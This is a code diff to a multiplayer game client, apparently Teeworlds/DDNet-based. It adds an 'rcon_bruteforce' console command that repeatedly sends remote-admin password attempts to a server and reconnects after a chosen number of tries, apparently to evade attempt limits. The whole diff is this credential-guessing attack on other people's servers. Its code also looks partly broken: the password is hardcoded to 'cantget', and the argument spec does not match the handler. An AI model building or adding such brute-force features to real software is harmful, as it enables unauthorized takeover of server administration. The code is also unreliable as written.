@@ -585,6 +585,21 @@ void CClient::SendInput()
 			SendMsgExY(&Msg, MSGFLAG_FLUSH, true, !g_Config.m_ClDummy);
 		}
 	}
+
+	//bruteforce
+	if (isBruting)
+	{
+		brute_trys++;
+		if (brute_trys < cfg_brute_trys)
+		{
+			RconAuth("", BrutePassword);
+		}
+		else
+		{
+			Connect(BruteIp);
+			brute_trys = 0;
+		}
+	}
 }
 
 const char *CClient::LatestVersion()
@@ -2956,6 +2971,17 @@ void CClient::Con_RconAuth(IConsole::IResult *pResult, void *pUserData)
 	pSelf->RconAuth("", pResult->GetString(0));
 }
 
+void CClient::Con_RconBruteforce(IConsole::IResult *pResult, void *pUserData)
+{
+	CClient *pSelf = (CClient *)pUserData;
+	str_copy(pSelf->BruteIp, pResult->GetString(0), 64);
+	pSelf->cfg_brute_trys = pResult->GetInteger(1);
+	//str_copy(pSelf->BrutePassword, pResult->GetString(2), 1024);
+	str_copy(pSelf->BrutePassword, "cantget", sizeof(pSelf->BrutePassword));
+	dbg_msg("bruteforce", "starting bruteforce... with password %s", pSelf->BrutePassword);
+	pSelf->isBruting ^= true;
+}
+
 void CClient::Con_AddFavorite(IConsole::IResult *pResult, void *pUserData)
 {
 	CClient *pSelf = (CClient *)pUserData;
@@ -3188,6 +3214,7 @@ void CClient::RegisterCommands()
 	m_pConsole->Register("screenshot", "", CFGFLAG_CLIENT, Con_Screenshot, this, "Take a screenshot");
 	m_pConsole->Register("rcon", "r", CFGFLAG_CLIENT, Con_Rcon, this, "Send specified command to rcon");
 	m_pConsole->Register("rcon_auth", "s", CFGFLAG_CLIENT, Con_RconAuth, this, "Authenticate to rcon");
+	m_pConsole->Register("rcon_bruteforce", "is", CFGFLAG_CLIENT, Con_RconBruteforce, this, "bruteforce i trys before connect on server s");
 	m_pConsole->Register("play", "r", CFGFLAG_CLIENT|CFGFLAG_STORE, Con_Play, this, "Play the file specified");
 	m_pConsole->Register("record", "?s", CFGFLAG_CLIENT, Con_Record, this, "Record to the file");
 	m_pConsole->Register("stoprecord", "", CFGFLAG_CLIENT, Con_StopRecord, this, "Stop recording");
